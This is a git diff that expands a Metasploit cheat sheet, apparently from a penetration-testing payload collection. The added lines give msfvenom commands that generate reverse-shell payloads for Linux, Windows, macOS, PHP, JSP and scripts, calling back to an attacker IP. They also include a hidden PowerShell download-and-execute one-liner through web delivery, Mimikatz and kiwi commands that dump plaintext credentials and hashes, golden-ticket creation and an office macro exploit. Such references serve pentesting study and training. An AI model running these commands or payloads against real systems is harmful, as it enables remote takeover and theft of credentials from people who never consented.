@@ -1,5 +1,26 @@
 # Metasploit
 
+## Summary
+
+* [Installation](#installation)
+* [Sessions](#sessions)
+* [Background handler](#background-handler)
+* [Meterpreter - Basic](#meterpreter---basic)
+    * [Generate a meterpreter](#generate-a-meterpreter)
+    * [Meterpreter Webdelivery](#meterpreter-webdelivery)
+    * [Get System](#get-system)
+    * [Persistence Startup](#persistence-startup)
+    * [Network Monitoring](#network-monitoring)
+    * [Portforward](#portforward)
+    * [Upload / Download](#upload---download)
+    * [Execute from Memory](#execute-from-memory)
+    * [Mimikatz](#mimikatz)
+    * [Pass the Hash - PSExec](#pass-the-hash---psexec)
+* [Scripting Metasploit](#scripting-metasploit)
+* [Multiple transports](#multiple-transports)
+* [Best of - Exploits](#best-of---exploits)
+* [References](#references)
+
 ## Installation
 
 ```powershell
@@ -25,7 +46,7 @@ sessions -c cmd           -> Execute a command on several sessions
 sessions -i 10-20 -c "id" -> Execute a command on several sessions
 ```
 
-## Multi/handler in background (screen/tmux)
+## Background handler
 
 ExitOnSession : the handler will not exit if the meterpreter dies.
 
@@ -38,14 +59,49 @@ set PAYLOAD generic/shell_reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 4444
 set ExitOnSession false
-exploit -j
+
+generate -o /tmp/meterpreter.exe -f exe
+to_handler
 
 [ctrl+a] + [d]
 ```
 
 ## Meterpreter - Basic
 
-### SYSTEM / Administrator privilege
+### Generate a meterpreter
+
+```powershell
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
+$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
+$ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
+$ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
+```
+
+### Meterpreter Webdelivery
+
+Set up a Powershell web delivery listening on port 8080.
+
+```powershell
+use exploit/multi/script/web_delivery
+set TARGET 2
+set payload windows/x64/meterpreter/reverse_http
+set LHOST 10.0.0.1
+set LPORT 4444
+run
+```
+
+```powershell
+powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
+```
+
+
+### Get System
 
 ```powershell
 meterpreter > getsystem
@@ -75,6 +131,16 @@ OPTIONS:
 meterpreter > run persistence -U -p 4242
 ```
 
+### Network Monitoring
+
+```powershell
+# list interfaces
+run packetrecorder -li
+
+# record interface n°1
+run packetrecorder -i 1
+```
+
 ### Portforward
 
 ```powershell
@@ -100,11 +166,14 @@ execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
 load mimikatz
 mimikatz_command -f version
 mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::wdigest
 mimikatz_command -f sekurlsa::searchPasswords
+mimikatz_command -f sekurlsa::logonPasswords full
 ```
 
 ```powershell
 load kiwi
+creds_all
 golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
 ```
 
@@ -135,7 +204,7 @@ exploit -j -z
 
 use exploit/multi/fileformat/office_word_macro 
 set PAYLOAD windows/meterpreter/reverse_https
-set LHOST 159.65.52.124
+set LHOST 10.10.14.22
 set LPORT 4646
 exploit
 ```
@@ -161,3 +230,4 @@ Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 3
 ## References
 
 * [Multiple transports in a meterpreter payload - ionize](https://ionize.com.au/multiple-transports-in-a-meterpreter-payload/)
+* [Creating Metasploit Payloads - Peleus](https://netsec.ws/?p=331)
